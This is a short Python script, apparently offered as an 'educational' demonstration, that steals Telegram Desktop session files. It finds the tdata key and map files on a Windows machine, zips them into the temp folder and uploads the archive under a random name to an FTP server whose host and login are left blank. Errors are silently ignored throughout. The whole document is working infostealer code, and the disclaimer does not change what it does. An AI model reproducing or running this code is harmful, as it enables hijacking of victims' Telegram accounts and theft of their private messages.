## WARNING: This code is for educational purposes only. It demonstrates how Telegram data can be stolen.
## Do not use it for illegal activities. Misuse is strictly prohibited.

from re import findall
from zipfile import ZipFile
from ftplib import FTP_TLS
import os, random

pathusr = os.path.expanduser('~')
teleg = pathusr + '\\AppData\\Roaming\\Telegram Desktop\\tdata'
zipp = pathusr + '\\AppData\\Local\\Temp\\tdata.zip'

server = ''
user = ''
pasd = ''

ftp=FTP_TLS()
ftp.set_debuglevel(2)
ftp.connect(server, 21)
ftp.sendcmd('USER ' + str(user))
ftp.sendcmd('PASS ' + str(pasd))

try:
	files1 = os.listdir(teleg)
	files1 = ' '.join(files1)
	files2 = os.listdir(teleg + '\D877F783D5D3EF8C')
	files2 = ' '.join(files2)
	file1 = findall(r'(D877F783D5D3EF8C\S)', files1)
	file2 = findall(r'(map\S)', files2)
	file1 = ''.join(file1)
	file2 = ''.join(file2)
	file1 = teleg + '\\' + file1
	file2 = teleg + '\\D877F783D5D3EF8C\\' + file2
	attch = []
	attch.append(file1)
	attch.append(file2)
	zippy = ZipFile(zipp, 'w')
	for file in attch:
		print(file)
		zippy.write(file)
	zippy.close()

except Exception as e:
	pass

str1 = '123456789'
str2 = 'qwertyuiopasdfghjklzxcvbnm'
str3 = str2.upper()
str4 = str1 + str2 + str3
ls = list(str4)
random.shuffle(ls)
randomstr = ''.join([random.choice(ls) for x in range(10)])

telega = randomstr + '.teleg.zip.txt'

try:
	ftp.storbinary('STOR ' + telega, open(zipp, 'rb'))
except Exception as e:
	pass

ftp.close()